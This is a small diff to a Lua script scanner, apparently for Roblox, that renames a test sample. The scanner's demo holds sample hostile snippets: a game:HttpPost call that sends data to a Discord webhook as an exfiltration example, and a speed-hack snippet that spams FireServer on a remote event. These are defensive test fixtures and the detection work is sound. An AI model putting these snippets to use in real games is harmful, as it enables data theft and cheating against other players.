@@ -638,8 +638,8 @@ function ScanningLua.runDemo()
         game:HttpPost("https://discord.com/api/webhooks/123456/abcdef", data)
     ]]
 
-    -- Código com nome suspeito (simulando script de hack)
-    local sampleCodeSuspiciousName = [[
+    -- Código com nome suspeito + FireServer spam (abuso de remotes)
+    local sampleCodeRemoteSpam = [[
         local speed = 100
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speed
         game:GetService("ReplicatedStorage").RemoteEvent:FireServer("speed", speed)
@@ -681,7 +681,7 @@ function ScanningLua.runDemo()
     local result10 = ScanningLua.scanCode(sampleCodeUrlExfil, "discord_exfiltration.lua")
 
     print("\n--- Analisando Amostra 11: Script com nome suspeito + FireServer spam ---")
-    local result11 = ScanningLua.scanCode(sampleCodeSuspiciousName, "speed_hack_kill_money.lua")
+    local result11 = ScanningLua.scanCode(sampleCodeRemoteSpam, "speed_hack_kill_money.lua")
 
     -- Executar correlação entre scripts (#23)
     print("\n--- Correlacionando scripts ---")
